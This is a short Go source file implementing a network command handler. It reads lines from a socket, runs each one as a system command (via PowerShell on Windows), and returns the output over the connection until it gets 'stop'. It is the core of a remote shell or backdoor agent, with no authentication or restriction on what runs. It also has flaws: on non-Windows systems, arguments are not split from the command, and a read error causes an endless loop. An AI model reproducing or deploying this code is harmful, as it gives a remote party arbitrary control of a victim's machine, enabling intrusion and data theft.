package execution

import (
	"bufio"
	"bytes"
	"encoding/gob"
	"fmt"
	"net"
	"os/exec"
	"runtime"
	"strings"
)

type Command struct {
	Output string
	Error  string
}

func ExecuteCommand(connection net.Conn) {
	reader := bufio.NewReader(connection)
	loop := true

	for loop {
		rawInput, err := reader.ReadString('\n')
		if err != nil {
			continue
		}

		input := strings.TrimSuffix(rawInput, "\n")
		if input == "stop" {
			loop = false
			continue
		} else {
			var cmdOutput bytes.Buffer
			var cmdError bytes.Buffer
			var cmdInstance *exec.Cmd

			if runtime.GOOS == "windows" {
				cmdInstance = exec.Command("powershell.exe", "/C", input)
			} else {
				cmdInstance = exec.Command(input)
			}

			cmdInstance.Stdout = &cmdOutput
			cmdInstance.Stderr = &cmdError

			cmdInstance.Run()

			cmdStruct := &Command{}
			cmdStruct.Output = cmdOutput.String()
			cmdStruct.Error = cmdError.String()

			encoder := gob.NewEncoder(connection)
			err = encoder.Encode(cmdStruct)
			if err != nil {
				fmt.Println(err)
				continue
			}
		}
	}
}
